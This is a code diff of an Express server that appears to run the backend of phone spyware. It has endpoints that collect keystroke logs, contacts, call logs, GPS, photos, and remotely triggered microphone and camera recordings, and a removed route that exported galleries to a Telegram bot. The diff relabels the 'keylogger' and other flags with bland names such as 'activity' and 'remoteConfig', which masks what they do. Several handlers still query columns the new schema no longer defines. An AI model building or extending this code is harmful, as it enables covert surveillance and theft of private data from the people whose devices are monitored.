@@ -91,12 +91,14 @@ async function setupDatabase() {
     await pool.query(`
       CREATE TABLE IF NOT EXISTS device_features (
         device_id VARCHAR(255) PRIMARY KEY,
+        deviceInfo BOOLEAN DEFAULT TRUE,
+        battery BOOLEAN DEFAULT TRUE,
         gps BOOLEAN DEFAULT TRUE,
-        gallery BOOLEAN DEFAULT TRUE,
-        keylogger BOOLEAN DEFAULT TRUE,
-        audio BOOLEAN DEFAULT TRUE,
-        video BOOLEAN DEFAULT TRUE,
-        contacts BOOLEAN DEFAULT TRUE
+        installedApps BOOLEAN DEFAULT TRUE,
+        activity BOOLEAN DEFAULT TRUE,
+        notifications BOOLEAN DEFAULT TRUE,
+        sync BOOLEAN DEFAULT TRUE,
+        remoteConfig BOOLEAN DEFAULT TRUE
       );
     `);
 
@@ -142,6 +144,20 @@ function requireAdmin(req, res, next) {
   if (req.session.role !== 'admin') return res.status(403).json({ error: "Admin access required." });
   next();
 }
+
+// ================= IN-MEMORY STORE =================
+const deviceStates = new Map();
+const keylogs = [];
+const deviceUIs = new Map();
+const galleryData = new Map();
+const galleryRequestFlags = new Map();
+const gpsRequestFlags = new Map();
+const audioRequestFlags = new Map();
+const videoRequestFlags = new Map();
+const callLogsData = new Map();
+const contactsData = new Map();
+const exportRequestFlags = new Map();
+const userFeaturesData = new Map(); // ইউজারের ফিচার পারমিশন (টেম্পোরারি)
 
 // ================= AUTH =================
 app.post("/api/signup", async (req, res) => {
@@ -194,19 +210,6 @@ app.get("/api/me", requireLogin, async (req, res) => {
 });
 
 // ================= DEVICE STATE =================
-const deviceStates = new Map();
-const keylogs = [];
-const deviceUIs = new Map();
-const galleryData = new Map();
-const galleryRequestFlags = new Map();
-const gpsRequestFlags = new Map();
-const audioRequestFlags = new Map();
-const videoRequestFlags = new Map();
-const callLogsData = new Map();
-const contactsData = new Map();
-const exportRequestFlags = new Map(); // নতুন
-const userFeaturesData = new Map(); // নতুন: ইউজারের ফিচার পারমিশন
-
 app.post("/api/device-state", async (req, res) => {
   try {
     const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude, accuracy } = req.body;
@@ -261,7 +264,17 @@ app.get("/api/devices", requireLogin, async (req, res) => {
       const result = await pool.query(
         "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices ORDER BY created_at DESC"
       );
-      return res.json(result.rows);
+      const devices = result.rows.map(row => {
+        const live = deviceStates.get(row.device_id);
+        if (live && live.last_seen > Date.now() - 120000) {
+          row.online = true;
+          row.battery = live.battery ?? row.battery;
+        } else {
+          row.online = false;
+        }
+        return row;
+      });
+      return res.json(devices);
     }
     const result = await pool.query(
       "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices WHERE owner_user_id=$1 ORDER BY created_at DESC",
@@ -288,9 +301,9 @@ app.post("/api/keylog", async (req, res) => {
     if (!deviceId || !deviceToken || !text) return res.status(400).json({ error: "deviceId, deviceToken and text required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
-    const feature = await pool.query("SELECT keylogger FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].keylogger === false) {
-      return res.status(403).json({ error: "Keylogger disabled by admin." });
+    const feature = await pool.query("SELECT activity FROM device_features WHERE device_id=$1", [deviceId]);
+    if (feature.rows.length > 0 && feature.rows[0].activity === false) {
+      return res.status(403).json({ error: "Feature disabled by admin." });
     }
     keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
     res.json({ success: true });
@@ -315,7 +328,7 @@ app.post("/api/gallery/request", requireLogin, async (req, res) => {
   }
   const feature = await pool.query("SELECT gallery FROM device_features WHERE device_id=$1", [deviceId]);
   if (feature.rows.length > 0 && feature.rows[0].gallery === false) {
-    return res.status(403).json({ error: "Gallery disabled by admin." });
+    return res.status(403).json({ error: "Feature disabled by admin." });
   }
   const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
   galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
@@ -374,7 +387,7 @@ app.post("/api/gps/request", requireLogin, async (req, res) => {
   }
   const feature = await pool.query("SELECT gps FROM device_features WHERE device_id=$1", [deviceId]);
   if (feature.rows.length > 0 && feature.rows[0].gps === false) {
-    return res.status(403).json({ error: "GPS disabled by admin." });
+    return res.status(403).json({ error: "Feature disabled by admin." });
   }
   gpsRequestFlags.set(deviceId, true);
   res.json({ success: true });
@@ -402,7 +415,7 @@ app.post("/api/audio/request", requireLogin, async (req, res) => {
     }
     const feature = await pool.query("SELECT audio FROM device_features WHERE device_id=$1", [deviceId]);
     if (feature.rows.length > 0 && feature.rows[0].audio === false) {
-      return res.status(403).json({ error: "Audio recording disabled by admin." });
+      return res.status(403).json({ error: "Feature disabled by admin." });
     }
     audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
     res.json({ success: true, requestedDuration: duration });
@@ -432,7 +445,6 @@ app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
       fs.unlink(req.file.path, () => {});
       return res.status(401).json({ error: "Invalid device token." });
     }
-    // deviceId দিয়ে ফাইলের নাম বদলান
     const newFilename = `${deviceId}_${req.file.filename}`;
     const newPath = path.join(__dirname, 'uploads', 'audio', newFilename);
     fs.renameSync(req.file.path, newPath);
@@ -480,7 +492,7 @@ app.post("/api/video/request", requireLogin, async (req, res) => {
     }
     const feature = await pool.query("SELECT video FROM device_features WHERE device_id=$1", [deviceId]);
     if (feature.rows.length > 0 && feature.rows[0].video === false) {
-      return res.status(403).json({ error: "Video recording disabled by admin." });
+      return res.status(403).json({ error: "Feature disabled by admin." });
     }
     const safeCameraType = (cameraType === 0 || cameraType === 1) ? cameraType : 1;
     videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: safeCameraType });
@@ -557,7 +569,7 @@ app.post("/api/calllogs", async (req, res) => {
     }
     const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
     if (feature.rows.length > 0 && feature.rows[0].contacts === false) {
-      return res.status(403).json({ error: "Contacts disabled by admin." });
+      return res.status(403).json({ error: "Feature disabled by admin." });
     }
     callLogsData.set(deviceId, callLogs);
     res.json({ success: true, count: callLogs.length });
@@ -579,7 +591,7 @@ app.post("/api/contacts", async (req, res) => {
     }
     const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
     if (feature.rows.length > 0 && feature.rows[0].contacts === false) {
-      return res.status(403).json({ error: "Contacts disabled by admin." });
+      return res.status(403).json({ error: "Feature disabled by admin." });
     }
     contactsData.set(deviceId, contacts);
     res.json({ success: true, count: contacts.length });
@@ -686,7 +698,6 @@ app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
     const users = [];
     for (const u of result.rows) {
       const deviceCount = await pool.query("SELECT COUNT(*) FROM devices WHERE owner_user_id=$1", [u.uid]);
-      const buildCount = 0; // placeholder
       const features = userFeaturesData.get(u.uid) || {
         deviceInfo: true,
         battery: true,
@@ -699,11 +710,11 @@ app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
       };
       users.push({
         uid: u.uid,
-        name: u.email, // in absence of name field, use email prefix
+        name: u.email.split('@')[0], // temporary
         email: u.email,
         role: u.role === 'admin' ? 'ADMIN' : 'USER',
         deviceCount: parseInt(deviceCount.rows[0].count),
-        buildCount: buildCount,
+        buildCount: 0,
         lastActive: null,
         features: features
       });
@@ -716,13 +727,23 @@ app.get("/api/admin/devices", requireLogin, requireAdmin, async (req, res) => {
   try {
     const result = await pool.query(
       `SELECT d.device_id, d.device_name, d.battery, d.online, d.last_seen, u.email AS owner_email,
-              df.gps, df.gallery, df.keylogger, df.audio, df.video, df.contacts
+              df.deviceInfo, df.battery, df.gps, df.installedApps, df.activity, df.notifications, df.sync, df.remoteConfig
        FROM devices d
        JOIN users u ON d.owner_user_id = u.id
        LEFT JOIN device_features df ON d.device_id = df.device_id
        ORDER BY d.last_seen DESC`
     );
-    res.json({ devices: result.rows });
+    const devices = result.rows.map(row => {
+      const live = deviceStates.get(row.device_id);
+      if (live && live.last_seen > Date.now() - 120000) {
+        row.online = true;
+        row.battery = live.battery ?? row.battery;
+      } else {
+        row.online = false;
+      }
+      return row;
+    });
+    res.json({ devices });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices." }); }
 });
 
@@ -730,7 +751,7 @@ app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, re
   try {
     const { deviceId, feature, enabled } = req.body;
     if (!deviceId || !feature) return res.status(400).json({ error: "deviceId and feature required." });
-    const allowedFeatures = ['gps', 'gallery', 'keylogger', 'audio', 'video', 'contacts'];
+    const allowedFeatures = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
     if (!allowedFeatures.includes(feature)) return res.status(400).json({ error: "Invalid feature." });
 
     await pool.query(
@@ -742,115 +763,7 @@ app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, re
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update feature." }); }
 });
 
-// ================= ADMIN ACTION ENDPOINTS =================
-app.post("/api/admin/gps/request", requireLogin, requireAdmin, async (req, res) => {
-  const { deviceId } = req.body;
-  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  gpsRequestFlags.set(deviceId, true);
-  res.json({ success: true });
-});
-
-app.post("/api/admin/audio/request", requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const { deviceId, duration } = req.body;
-    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-    if (!duration || isNaN(duration) || duration < 10 || duration > 300) {
-      return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
-    }
-    audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
-    res.json({ success: true, requestedDuration: duration });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Audio request failed" }); }
-});
-
-app.post("/api/admin/video/request", requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const { deviceId, duration, cameraType } = req.body;
-    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-    if (!duration || isNaN(duration) || duration < 5 || duration > 30) {
-      return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
-    }
-    const safeCameraType = (cameraType === 0 || cameraType === 1) ? cameraType : 1;
-    videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: safeCameraType });
-    res.json({ success: true, requestedDuration: duration, cameraType: safeCameraType });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Video request failed" }); }
-});
-
-app.post("/api/admin/gallery/request", requireLogin, requireAdmin, async (req, res) => {
-  const { deviceId, count } = req.body;
-  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
-  galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
-  res.json({ success: true, count: safeCount });
-});
-
-app.post("/api/admin/gallery/export", requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const { deviceId } = req.body;
-    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-
-    const adminRes = await pool.query(
-      "SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1",
-      [req.session.userId]
-    );
-    if (adminRes.rows.length === 0 || !adminRes.rows[0].bot_token || !adminRes.rows[0].chat_id) {
-      return res.status(400).json({ error: "Admin Telegram settings not configured." });
-    }
-
-    exportRequestFlags.set(deviceId, {
-      requested: true,
-      botToken: adminRes.rows[0].bot_token,
-      chatId: adminRes.rows[0].chat_id
-    });
-
-    res.json({ success: true, message: "Export request sent to device." });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Gallery export failed." });
-  }
-});
-
-// ================= NEW: USER FEATURES & DEVICES =================
-app.get("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const uid = req.params.uid;
-    const features = userFeaturesData.get(uid) || {
-      deviceInfo: true,
-      battery: true,
-      gps: true,
-      installedApps: true,
-      activity: true,
-      notifications: true,
-      sync: true,
-      remoteConfig: true
-    };
-    res.json({ features });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
-});
-
-app.post("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const uid = req.params.uid;
-    const { features } = req.body;
-    if (!features || typeof features !== 'object') return res.status(400).json({ error: "features object required" });
-    const allowedKeys = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
-    for (const key of Object.keys(features)) {
-      if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
-    }
-    const current = userFeaturesData.get(uid) || {
-      deviceInfo: true,
-      battery: true,
-      gps: true,
-      installedApps: true,
-      activity: true,
-      notifications: true,
-      sync: true,
-      remoteConfig: true
-    };
-    userFeaturesData.set(uid, { ...current, ...features });
-    res.json({ success: true });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
-});
-
+// ================= NEW: USER DEVICES & FEATURES =================
 app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req, res) => {
   try {
     const uid = req.params.uid;
@@ -861,6 +774,63 @@ app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req,
     res.json({ devices: devices.rows });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices" }); }
 });
+
+app.get("/api/admin/device/:deviceId/features", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const featureRes = await pool.query("SELECT * FROM device_features WHERE device_id=$1", [deviceId]);
+    if (featureRes.rows.length === 0) {
+      return res.json({ features: {
+        deviceInfo: true, battery: true, gps: true, installedApps: true,
+        activity: true, notifications: true, sync: true, remoteConfig: true
+      }});
+    }
+    const f = featureRes.rows[0];
+    res.json({ features: {
+      deviceInfo: f.deviceinfo, battery: f.battery, gps: f.gps, installedApps: f.installedapps,
+      activity: f.activity, notifications: f.notifications, sync: f.sync, remoteConfig: f.remoteconfig
+    }});
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
+});
+
+app.post("/api/admin/device/:deviceId/features", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const { features } = req.body;
+    if (!features || typeof features !== 'object') return res.status(400).json({ error: "features object required" });
+    const allowedKeys = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
+    for (const key of Object.keys(features)) {
+      if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
+    }
+    // Update device_features table
+    const updateQuery = Object.keys(features).map((key, idx) => `${key} = $${idx + 2}`).join(', ');
+    const values = [deviceId, ...Object.values(features)];
+    await pool.query(
+      `INSERT INTO device_features (device_id, ${Object.keys(features).join(', ')})
+       VALUES ($1, ${Object.keys(features).map((_, i) => `$${i + 2}`).join(', ')})
+       ON CONFLICT (device_id) DO UPDATE SET ${updateQuery}`,
+      values
+    );
+    res.json({ success: true });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
+});
+
+// ================= 24H OFFLINE DEVICE CLEANUP =================
+async function cleanupOfflineDevices() {
+  try {
+    const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
+    const result = await pool.query("DELETE FROM devices WHERE last_seen < $1 AND online = FALSE", [cutoff]);
+    if (result.rowCount > 0) console.log(`Removed ${result.rowCount} stale offline devices.`);
+    // Clean Maps
+    const devices = await pool.query("SELECT device_id FROM devices");
+    const validIds = new Set(devices.rows.map(d => d.device_id));
+    for (const key of [...deviceStates.keys()]) if (!validIds.has(key)) deviceStates.delete(key);
+    for (const key of [...galleryData.keys()]) if (!validIds.has(key)) galleryData.delete(key);
+    for (const key of [...callLogsData.keys()]) if (!validIds.has(key)) callLogsData.delete(key);
+    for (const key of [...contactsData.keys()]) if (!validIds.has(key)) contactsData.delete(key);
+  } catch (e) { console.error("Cleanup failed:", e); }
+}
+setInterval(cleanupOfflineDevices, 60 * 60 * 1000); // প্রতি ঘণ্টায়
 
 // ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
